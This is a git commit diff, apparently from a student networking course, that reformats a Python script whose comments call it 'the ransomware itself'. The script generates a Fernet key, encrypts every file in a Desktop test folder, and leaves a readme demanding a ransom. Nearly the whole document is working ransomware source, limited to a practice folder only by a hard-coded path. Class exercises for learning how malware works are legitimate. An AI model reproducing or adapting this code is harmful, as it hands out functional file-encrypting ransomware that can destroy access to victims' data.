7de0e46195428c5de9919526fa6f84a368c44a35
Erick Pérez <ericksebas2001@gmail.com>
2022-08-14 20:30:10 -0500

    Formateo de los archivos

--- Encrypt.py
+++ Encrypt.py
@@ -1,49 +1,52 @@
 from cryptography.fernet import Fernet
 import os
 import getpass
-#Para la prueba de este programa es necesario la creacion de una carpeta
-#en el escritorio de nombre "Ataque" y dentro de esta otra carpeta
-#de nombre "Primera prueba"
-
-#Este archivo es el ransomware como tal y se encarga de encriptar
-#los archivos y pedir el rescate
 
 
-#Genera la key con la que se encriptara los archivos y la exporta en un archivo con extension key
+# Para la prueba de este programa es necesario la creacion de una carpeta
+# en el escritorio de nombre "Ataque" y dentro de esta otra carpeta
+# de nombre "Primera prueba"
+
+# Este archivo es el ransomware como tal y se encarga de encriptar
+# los archivos y pedir el rescate
+
+
+# Genera la key con la que se encriptara los archivos y la exporta en un archivo con extension key
 
 def generarkey():
     key = Fernet.generate_key()
-    with open("key.key","wb") as key_file:
+    with open("key.key", "wb") as key_file:
         key_file.write(key)
 
-#Permite obtener el key que permite la encripcion y la desencripcion
+
+# Permite obtener el key que permite la encripcion y la desencripcion
 def retornarkey():
     return open("key.key", "rb").read()
 
-#Permite la encripcion de los archivos contenidos en el directorio indicado
-#esto se realiza a traves de la encripcion de Fernet
+
+# Permite la encripcion de los archivos contenidos en el directorio indicado
+# esto se realiza a traves de la encripcion de Fernet
 def encrypt(items, key):
     i = Fernet(key)
     for x in items:
         with open(x, "rb") as file:
-            file_data=file.read()
+            file_data = file.read()
         data = i.encrypt(file_data)
 
-        with open(x,"wb") as file:
+        with open(x, "wb") as file:
             file.write(data)
 
-#Permite que el codigo se ejecute en el modulo es el equivalente a la funcion main en JAVA
-if __name__ == "__main__":
-    archivos = 'C:\\Users\\'+getpass.getuser()+'\\Desktop\\Ataque\\Primera prueba'
-    items = os.listdir(archivos)
-    archivos_2 = [archivos+"\\"+ x for x in items]
 
+# Permite que el codigo se ejecute en el modulo es el equivalente a la funcion main en JAVA
+if __name__ == "__main__":
+    archivos = 'C:\\Users\\' + getpass.getuser() + '\\Desktop\\Ataque\\Primera prueba'
+    items = os.listdir(archivos)
+    archivos_2 = [archivos + "\\" + x for x in items]
 
 generarkey()
 key = retornarkey()
 
 encrypt(archivos_2, key)
 
-with open(archivos+"\\"+"readme.txt","w") as file:
+with open(archivos + "\\" + "readme.txt", "w") as file:
     file.write("Archivos encriptados por practica de Fundamentos de Redes \nSe solicita un rescate")
-
